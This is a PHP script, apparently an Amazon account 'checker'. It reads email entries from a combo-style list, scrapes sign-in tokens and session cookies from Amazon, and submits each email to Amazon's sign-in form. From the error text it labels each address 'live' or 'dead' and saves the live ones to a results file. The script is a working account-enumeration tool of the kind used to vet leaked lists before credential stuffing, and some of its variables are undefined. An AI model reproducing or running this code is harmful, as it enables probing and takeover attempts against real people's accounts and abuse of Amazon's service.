<?php

function amz($emails){
$email = $emails;
$email = explode('|',$email);
$email = explode(':',$email['0']);
$email = $email[0];
$jorr = rand(1,999);
$cookiess = "cookie/cookie.txt";
if(!$email){
    $data = array('response' => '100', 'data' => "$email", 'status' => 'unknown');
	echo json_encode($data);
}else{
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "https://www.amazon.com/gp/css/account/info/view.html?ie=UTF8&ref_=hp_ss_cnep");
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "GET");
curl_setopt($ch, CURLOPT_HEADER, 1);
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookiess);
curl_setopt($ch, CURLOPT_COOKIEFILE, $cookiess);
curl_setopt($ch, CURLOPT_RETURNTRANSFER,true); 
curl_setopt($ch, CURLOPT_FOLLOWLOCATION,true); 
curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');
$result = curl_exec($ch);
curl_close($ch);
if($result){
$baca = explode('name="appActionToken" value="',$result);
$baca2 = explode('"',$baca[1]);
$appActionToken = $baca2[0];
$bacaz = explode('name="openid.return_to" value="',$result);
$bacaz2 = explode('"',$bacaz[1]);
$openid = $bacaz2[0];
$bacaw = explode('name="prevRID" value="',$result);
$bacaw2 = explode('"',$bacaw[1]);
$prevRID = $bacaw2[0];
$bacaq = explode('session-id=',$result);
$bacaq2 = explode(';',$bacaq[1]);
$session = $bacaq2[0];
$bacar = explode('name="workflowState" value="',$result);
$bacar2 = explode('"',$bacar[1]);
$workflowState = $bacar2[0];
$bacat = explode('set-cookie: session-id=',$result);
$bacat2 = explode(';',$bacat[1]);
$session = $bacat2[0];
$bacac = explode('set-cookie: ubid-main=',$result);
$bacac2 = explode(';',$bacac[1]);
$ubid = $bacac2[0];
$bacay = explode('set-cookie: session-token=',$result);
$bacay2 = explode(';',$bacay[1]);
$session1 = $bacay2[0];
$headers = array();
$headers[] = 'Authority: www.amazon.com';
$headers[] = 'Cache-Control: max-age=0';
$headers[] = 'Origin: https://www.amazon.com';
$headers[] = 'Upgrade-Insecure-Requests: 1';
$headers[] = 'Content-Type: application/x-www-form-urlencoded';
$headers[] = 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3';
$headers[] = 'Accept-Encoding: gzip, deflate, br';
$headers[] = 'Accept-Language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7';
$headers[] = 'Cookie: session-id='.$session.'; ubid-main='.$ubid.'; session-token='.$session1.';';  
$ch2 = curl_init();
curl_setopt($ch2, CURLOPT_URL,"https://www.amazon.com/ap/signin?openid.pape.max_auth_age=0&openid.return_to=https%3A%2F%2Fwww.amazon.com%2F%3Fref_%3Dnav_ya_signin&openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.assoc_handle=usflex&openid.mode=checkid_setup&openid.claimed_id=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0&");
curl_setopt($ch2, CURLOPT_POST, 1);
curl_setopt($ch2, CURLOPT_COOKIEJAR, $cookiess);
curl_setopt($ch2, CURLOPT_COOKIEFILE, $cookiess);
curl_setopt($ch2, CURLOPT_POSTFIELDS,"appActionToken=$appActionToken&appAction=SIGNIN_PWD_COLLECT&workflowState=$workflowState&email=$email&password=&create=0");  //Post Fields
curl_setopt($ch2, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch2, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch2, CURLOPT_FOLLOWLOCATION,true); 
curl_setopt($ch2, CURLOPT_ENCODING, 'gzip, deflate');
$result2 = curl_exec($ch2);
if(!$result2){
	$res = 'dead';
}else
if(strpos($result2,"We cannot find an account with")){
    $res = 'dead';
}else
if(strpos($result2,"Enter the characters you see below")){
    $res = 'dead';
}else{  
    $res = 'live';
}
}else{
    $res = 'dead';
	
}
}
return $res;   
}



function akun_amazon($js){
  date_default_timezone_set('Asia/Jakarta');
   $jam = date('H-i');
 $a = $nama_files;
 $jum = count(file($a));
 echo " Jumlah Akun $jum \n";
 $save = "../result/mail".$date.$jam.".txt";
 $i = 0;
 while($i < $jum){
   $email = file($a)[$i];
   $cek = amz($email);
   
   if($cek == "live"){
     $res = "\e[1;32m Live : $email \n";
     $sav = fopen($save,"a+");
     fwrite($sav, $email."\n");
     fclose($sav);
   }else{
     $res = "\e[1;31m Dead \n";
   }
   echo "\e[1;37m [$i]--> $res ";
   $i++;
 }
 echo "\n Total Live : ".count(file($save));
}


function save($file,$data){
$save = fopen($file,"a");
fwrite($save, $data);
fclose($save);
}

